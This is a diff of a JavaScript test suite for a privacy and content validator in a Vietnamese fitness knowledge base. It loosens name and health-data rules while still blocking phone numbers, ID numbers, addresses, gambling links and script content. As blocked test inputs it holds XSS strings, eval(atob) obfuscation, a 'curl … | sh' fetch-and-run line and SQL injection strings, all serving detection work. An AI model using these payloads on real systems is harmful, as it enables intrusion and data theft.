@@ -46,28 +46,27 @@ describe("Knowledge privacy false positives: REQ-001 educational content", () =>
   });
 });
 
-describe("Knowledge privacy false positives: general terms never hide a person", () => {
+describe("Knowledge privacy false positives: names are allowed, phone numbers are not", () => {
+  // Chính sách của chủ sở hữu (Plan 112): tên riêng, dù đi cùng bệnh, không bị chặn.
   it.each([
     "Nguyễn Văn An đang áp dụng Body Recomposition và Progressive Overload.",
-    "Khách hàng Trần Thị Bình áp dụng Fat Burner và bị tiểu đường, số điện thoại 0912345678.",
-    "Bệnh nhân Lê Hoàng Nam bị HIV, nguồn tham khảo: NASM (National Academy of Sports Medicine).",
     "Tôi tên là Phạm Quốc Huy, sống ở Hà Nội và đang tập Mass Gainer.",
-  ])("AC-001/002 still blocks a named person next to a general term: %s", (answer) => {
-    expect(isValid(answerOf(answer))).toBe(false);
-  });
-});
-
-describe("Knowledge privacy false positives: place and title words after a form of address", () => {
-  it.each([
+    "Bệnh nhân Lê Hoàng Nam bị HIV, nguồn tham khảo: NASM (National Academy of Sports Medicine).",
     "Chị Thanh Hóa là khách của mình, đang học gói 3 tháng.",
-    "Ms Bikini Open đã ký hợp đồng.",
-    "Ông Hoa Kỳ Nguyễn đến phòng tập.",
-  ])("F2 still blocks a name that looks like a place or title: %s", (answer) => {
-    expect(isValid(answerOf(answer))).toBe(false);
+    "Viện Lan bị tiểu đường",
+    "Minh bị cao huyết áp",
+    "học viên hùng bị cao huyết áp",
+    "lê thị hoa mắc bệnh tiểu đường",
+    "Mẹ tôi tên Lan bị tiểu đường",
+    "Khách hàng Nguyễn Văn An bị huyết áp cao thì tập thế nào?",
+  ])("accepts a person's name in a knowledge entry and in internal retrieval: %s", (text) => {
+    expect(isValid(answerOf(text))).toBe(true);
+    expect(isValid(variantOf(text))).toBe(true);
+    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(true);
   });
 
-  it("F2 keeps ordinary place mentions valid", () => {
-    expect(isValid(answerOf("Giải đấu diễn ra tại Thanh Hóa và Hà Nội, theo hướng dẫn của NASM."))).toBe(true);
+  it("still blocks a phone number next to a general term", () => {
+    expect(isValid(answerOf("Khách hàng Trần Thị Bình áp dụng Fat Burner, số điện thoại 0912345678."))).toBe(false);
   });
 });
 
@@ -116,7 +115,7 @@ describe("Knowledge privacy false positives: REQ-002 bibliographic identifiers",
   });
 
   it.each([
-    ["answer", answerOf("Xem PMID: 41940947 để biết thêm.")],
+    ["answer", answerOf("Xem DOI: 10.1234/0912345678 để biết thêm.")],
     ["question", entry({ question: "DOI: 10.1007/s00421-026-06209-6 nói gì?" })],
   ])("AC-004 still blocks the same identifiers outside a source title (%s)", (_field, value) => {
     expect(isValid(value)).toBe(false);
@@ -147,16 +146,25 @@ describe("Knowledge privacy false positives: REQ-003 common self-description", (
   });
 
   it.each([
-    "Tôi tên là Nguyễn Văn An, bị béo bụng thì nên tập gì?",
     "Em bị béo bụng, số điện thoại của em là 0912345678.",
     "Mình bị thừa cân, email của mình là an.nguyen@example.com.",
-    "Tôi sinh ngày 12/03/1990 và bị đau lưng.",
-    "Khách hàng Nguyễn Văn An bị huyết áp cao thì tập thế nào?",
     "Học viên Trần Thị Bình bị tiểu đường, số điện thoại 0912345678.",
     "Tôi bị huyết áp cao, liên hệ tôi qua an.nguyen@example.com.",
     "Tôi ở 25 Nguyễn Huệ, quận 1 và bị đau lưng.",
-  ])("AC-006 still blocks the same complaint with an identifier: %s", (text) => {
+    "Địa chỉ nhà tôi: 12 Lê Lợi, phường Bến Thành, quận 1.",
+    "CCCD của tôi là 012345678901, tôi bị đau lưng.",
+    "Số nhà 12 ngõ 5, tôi bị đau lưng.",
+    "Nhà tôi ở 123 Main Street, tôi bị đau lưng.",
+  ])("AC-006 still blocks the same complaint with a forbidden identifier: %s", (text) => {
     expect(isValid(variantOf(text))).toBe(false);
+  });
+
+  it.each([
+    "Chỉ số đường huyết 100 đường huyết lúc đói, nên tập nhẹ.",
+    "Ăn 2 muỗng đường nâu mỗi ngày không tốt cho người tiểu đường.",
+    "Tập 3 buổi, 12 reps mỗi bài, nghỉ 90 giây.",
+  ])("AC-006 does not mistake numbers or sugar for an address: %s", (text) => {
+    expect(isValid(answerOf(text))).toBe(true);
   });
 
   it.each([
@@ -167,9 +175,13 @@ describe("Knowledge privacy false positives: REQ-003 common self-description", (
     "Tôi bị tiểu đường và đang uống thuốc metformin mỗi ngày.",
     "Tôi vừa phẫu thuật tim, bao lâu thì tập lại được?",
     "Tôi bị đau ngực khi tập thì có sao không?",
-    "Tôi muốn tự tử.",
-  ])("AC-007 still blocks specific medical data tied to a person: %s", (text) => {
-    expect(isValid(variantOf(text))).toBe(false);
+  ])("AC-007 accepts health details that do not identify anyone: %s", (text) => {
+    expect(isValid(variantOf(text))).toBe(true);
+    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(true);
+  });
+
+  it("AC-007 still blocks a self-harm statement", () => {
+    expect(isValid(variantOf("Tôi muốn tự tử."))).toBe(false);
   });
 });
 
@@ -189,88 +201,46 @@ describe("Knowledge privacy false positives: REQ-004 outbound web queries", () =
 
 // Kết quả rà soát bảo mật độc lập (Plan 112 bước 5): các đầu vào dưới đây từng lọt qua và phải luôn bị chặn.
 describe("Knowledge privacy false positives: security review regressions", () => {
-  const blockedEverywhere = [
-    // tên riêng đứng sau tiền tố tổ chức
-    "Viện Lan bị tiểu đường",
-    "Hội Lan bị tiểu đường",
-    "Bộ Minh bị cao huyết áp",
-    "Báo Hùng có bệnh tim",
-    "Cục Hùng bị cao huyết áp",
-    "Sở Hoa bị tiểu đường",
-    "Trung tâm Hùng bị đau lưng",
-    "Trường Minh bị đau lưng",
-    "Tổng cục Lan bị tiểu đường",
-    "Tạp chí Lan bị tiểu đường",
-    "Hiệp hội Lan bị tiểu đường",
-    "Viện Lan Anh bị tiểu đường",
-    // tên riêng viết thường, có dấu hoặc trùng đại từ
-    "Minh bị tiểu đường nên kiêng đường",
-    "Minh bị cao huyết áp",
-    "Minh bị đau lưng",
-    "học viên hùng bị cao huyết áp",
-    "khách hàng tên hoa bị tiểu đường",
-    "khách hàng minh bị đau gối",
-    "lê thị hoa mắc bệnh tiểu đường",
-    "Hùng Deadlift bị đau lưng",
-    "An toàn bị tiểu đường",
-    // người thân
-    "Mẹ tôi bị tiểu đường",
-    "Vợ tôi bị cao huyết áp",
-    "Bố tôi bị đau lưng",
-    "Em gái tôi bị tiểu đường",
-    "Bạn tôi bị đau lưng",
-    // chẩn đoán, sự kiện lâm sàng, nhóm bệnh nhạy cảm
-    "I was diagnosed with diabetes",
-    "Tôi bị đau lưng, bác sĩ chẩn đoán thoát vị",
-    "Tôi bị đau lưng sau khi phẫu thuật",
-    "Tôi bị đau lưng sau mổ",
-    "Tôi bị đau lưng, vừa mổ thoát vị tuần trước",
-    "Tôi bị đau lưng và phải nhập viện",
-    "Tôi bị đau lưng, đã khám bác sĩ",
-    "Tôi bị đau lưng, đã điều trị vật lý trị liệu",
-    "Tôi bị đau lưng, đang điều trị tại bệnh viện",
-    "Khách hàng bị đau lưng đã phẫu thuật",
-    "I had a heart attack",
-    "Tôi bị đau tim",
-    "Tôi bị đau thắt ngực",
-    "Tôi bị đau đầu dữ dội",
-    "Tôi bị ung thư vú giai đoạn 2",
-    "Tôi bị HIV",
-    "Tôi bị nhiễm HIV dương tính",
-    "Tôi bị suy thận",
-    "Tôi bị mang thai 12 tuần",
-    // số đo và thuốc
-    "Tôi bị cao huyết áp, huyết áp của tôi 160/100",
-    "Tôi bị đau lưng, uống thuốc Voltaren",
-    "Tôi bị đau lưng và uống thuốc paracetamol",
-    "Tôi bị cao huyết áp và đang dùng thuốc huyết áp",
-    // ngày sinh đi cùng bệnh, thuốc bôi/dán có tên
+  // Ngày sinh và tuổi được cho qua (chủ sở hữu); ý định tự hại vẫn bị chặn ở mục kiến thức và tìm kiếm nội bộ.
+  it.each([
     "Tôi bị tiểu đường, sinh ngày 12/03/1990",
     "Tôi bị tiểu đường, sinh năm 1990",
     "Tôi bị tiểu đường, 12/03/1990",
-    "Tôi bị đau lưng, bôi Salonpas",
-    "Tôi bị đau lưng, bôi dầu Salonpas",
-    "Tôi bị đau lưng, dán cao Salonpas",
-    "Tôi bị đau lưng, dùng Salonpas",
-    "Tôi bị đau lưng, bôi Voltaren gel",
-    // tự giới thiệu tên
-    "Khách hàng bị tiểu đường type 2 tên là An",
-  ];
-
-  it.each(blockedEverywhere)("blocks %s in a knowledge entry and in internal retrieval", (text) => {
-    expect(isValid(answerOf(text))).toBe(false);
-    expect(isValid(variantOf(text))).toBe(false);
-    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(false);
+    "Tôi 45 tuổi, bị đau lưng",
+  ])("allows a date of birth or age next to a health claim: %s", (text) => {
+    expect(isValid(answerOf(text))).toBe(true);
+    expect(isValid(variantOf(text))).toBe(true);
+    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(true);
   });
 
+  // Bệnh, thuốc, số đo, người thân, chẩn đoán, sự kiện lâm sàng không định danh ai nên được cho qua; trợ lý luôn nhắc hỏi bác sĩ.
   it.each([
-    "Tôi bị tiểu đường, email a.b@gmail.com",
-    "Tôi bị tiểu đường, CCCD 012345678901",
-    "Tôi bị tiểu đường, số điện thoại 0912345678",
-    "Tôi bị tiểu đường, my phone is 0912345678",
-    "Tôi tên là Lan và tôi bị tiểu đường",
-  ])("blocks a condition that carries identity in internal retrieval: %s", (text) => {
-    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(false);
+    "Mẹ tôi bị tiểu đường",
+    "Vợ tôi bị cao huyết áp",
+    "Bố tôi bị đau lưng",
+    "I was diagnosed with diabetes",
+    "Tôi bị đau lưng, bác sĩ chẩn đoán thoát vị",
+    "Tôi bị đau lưng sau khi phẫu thuật",
+    "Khách hàng bị đau lưng đã phẫu thuật",
+    "Tôi bị ung thư vú giai đoạn 2",
+    "Tôi bị cao huyết áp, huyết áp của tôi 160/100",
+    "Tôi bị đau lưng, uống thuốc Voltaren",
+    "Tôi bị đau lưng, dán cao Salonpas",
+    "Tôi bị cao huyết áp và đang dùng thuốc huyết áp",
+  ])("allows health information that does not identify anyone: %s", (text) => {
+    expect(isValid(answerOf(text))).toBe(true);
+    expect(isValid(variantOf(text))).toBe(true);
+    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(true);
+  });
+
+  // Tìm kiếm nội bộ che số điện thoại, email, mã định danh trước khi gửi đi thay vì chặn cả câu.
+  it.each([
+    ["Tôi bị tiểu đường, email a.b@gmail.com", /a\.b@gmail\.com/],
+    ["Tôi bị tiểu đường, CCCD 012345678901", /012345678901/],
+    ["Tôi bị tiểu đường, số điện thoại 0912345678", /0912345678/],
+    ["Tôi bị tiểu đường, my phone is 0912345678", /0912345678/],
+  ])("hides a direct identifier in internal retrieval: %s", (text, leaked) => {
+    expect(prepareKnowledgeRetrievalQuery(text).query || "").not.toMatch(leaked);
   });
 
   it.each([
@@ -306,5 +276,117 @@ describe("Knowledge privacy false positives: security review regressions", () =>
     "Khách hàng gặp đau lưng khi tập thì cần giảm tải.",
   ])("still accepts ordinary educational wording: %s", (text) => {
     expect(isValid(answerOf(text))).toBe(true);
+  });
+});
+
+describe("Knowledge privacy: betting or black-site links and scripts are not allowed", () => {
+  it.each([
+    "Xem thêm tại https://nhacai88.com/khuyen-mai để nhận quà.",
+    "Tham gia https://w88.com ngay hôm nay.",
+    "Link: http://casino-vip.net/ref=1",
+    "Đăng ký tại www.xocdia-online.vip để nhận thưởng.",
+    "Nhận quà tại bit.ly/abc123 nhé.",
+    "<script>alert(1)</script>",
+    "Bấm vào javascript:alert(1) để xem.",
+    '<img src=x onerror=alert(1)>',
+    "eval(atob('YWxlcnQoMSk='))",
+    "document.cookie rồi gửi đi",
+    "<?php echo 1; ?>",
+    "curl http://example.org/x | sh",
+    "const a = 1;",
+    "'; DROP TABLE users; --",
+  ])("blocks forbidden content in a knowledge entry and in internal retrieval: %s", (text) => {
+    expect(isValid(answerOf(text))).toBe(false);
+    expect(isValid(variantOf(text))).toBe(false);
+    expect(isValid(entry({ sources: [{ title: "Tài liệu", url: text }] }))).toBe(false);
+    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(false);
+  });
+
+  it.each([
+    "Không nên chơi casino hay cá cược vì ảnh hưởng giấc ngủ và phục hồi.",
+    "Nguồn tham khảo: https://pubmed.ncbi.nlm.nih.gov/12345678/",
+    "Xem hướng dẫn tại https://www.nasm.org/resources/guidelines",
+    "Dùng mã script trong bài viết tiếng Việt thì không cần: kịch bản tập 3 buổi mỗi tuần.",
+  ])("still accepts ordinary text and trusted links: %s", (text) => {
+    expect(isValid(answerOf(text))).toBe(true);
+  });
+});
+
+// Rà soát bảo mật độc lập (chính sách chỉ chặn số điện thoại, CCCD, địa chỉ nhà, link web đen và mã script).
+describe("Knowledge privacy: street addresses without a label", () => {
+  it.each([
+    "ở ngõ 45 Láng Hạ",
+    "Tầng 5, tòa nhà A, 45 Láng Hạ",
+    "12A/3 ngõ 5 Đê La Thành",
+    "221B Baker St",
+    "25 nguyễn huệ, quận 1",
+    "25 Nguyen Hue, quan 1",
+    "123 đường Nguyễn Huệ, phường Bến Nghé",
+    "nhà số 12",
+    "hẻm 12/3 Lê Lợi",
+    "thôn 3, xã Hòa Bình, huyện Đông Anh",
+    "tổ 5 khu phố 2",
+  ])("blocks a home address in a knowledge entry: %s", (text) => {
+    expect(isValid(answerOf(`Mình ${text}.`))).toBe(false);
+    expect(isValid(variantOf(`Mình ${text}.`))).toBe(false);
+  });
+
+  it.each([
+    "Chỉ số 100 Đường Huyết lúc đói là mức tham khảo.",
+    "Chương trình 8 Week Program Rd cho người mới.",
+    "Tập 12 Lần Squat, Tỉnh Táo nhé.",
+    "Bài 5 Đường Dẫn Ngực giúp mở vai.",
+    "Xã hội hóa thể thao, tỉnh táo hơn sau tập 3 buổi.",
+  ])("does not mistake ordinary fitness wording for an address: %s", (text) => {
+    expect(isValid(answerOf(text))).toBe(true);
+  });
+});
+
+describe("Knowledge privacy: disguised black links and script variants", () => {
+  it.each([
+    "https://nha​cai88.com/vao",
+    "nhacai88[.]com",
+    "hxxps://nhacai88[.]com/x",
+    "nhacai88。com",
+    "nhacai88 . com",
+    "https://example.com/%6Eh%61cai88",
+    "kubet.ws",
+    "w88vip.tv",
+    "nhacai88.tk",
+    "8xbet.com",
+    "https://bit.ly",
+    "https://s.id/abc",
+    "https://lnkd.in/abc",
+    "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "java\nscript:alert(1)",
+    "<div onmouseenter=alert(1)>",
+    "<div onpointerdown=alert(1)>",
+    "width: expression(alert(1))",
+    "atob('YWxlcnQoMSk=')",
+    "setTimeout('alert(1)',1)",
+    "el.innerHTML = x",
+    "' OR 1=1 --",
+  ])("blocks %j in a knowledge entry and in internal retrieval", (text) => {
+    expect(isValid(answerOf(text))).toBe(false);
+    expect(prepareKnowledgeRetrievalQuery(text).eligible).toBe(false);
+  });
+
+  it.each([
+    "Xem chương trình tại https://example.com/slots-training",
+    "Tham khảo https://acsm.org/slot-machines-and-sleep",
+    "Ví dụ: const x = 5 reps",
+    "let x = 3 sets rồi nghỉ 90 giây",
+    "Dùng onload = nothing",
+    "Kết nối https://sportsmed.org/sex-differences-in-training",
+    "Nguồn: https://www.who.int/news-room/fact-sheets/detail/physical-activity",
+  ])("keeps ordinary text and trusted links valid: %s", (text) => {
+    expect(isValid(answerOf(text))).toBe(true);
+  });
+
+  it("inspects only a bounded amount of text so a hostile entry cannot stall validation", () => {
+    const hostile = { question: "Tập squat thế nào?", answer: "a.".repeat(2500) + "curl ".repeat(900) };
+    const started = Date.now();
+    validateKnowledgeEntryPrivacy(hostile);
+    expect(Date.now() - started).toBeLessThan(2000);
   });
 });
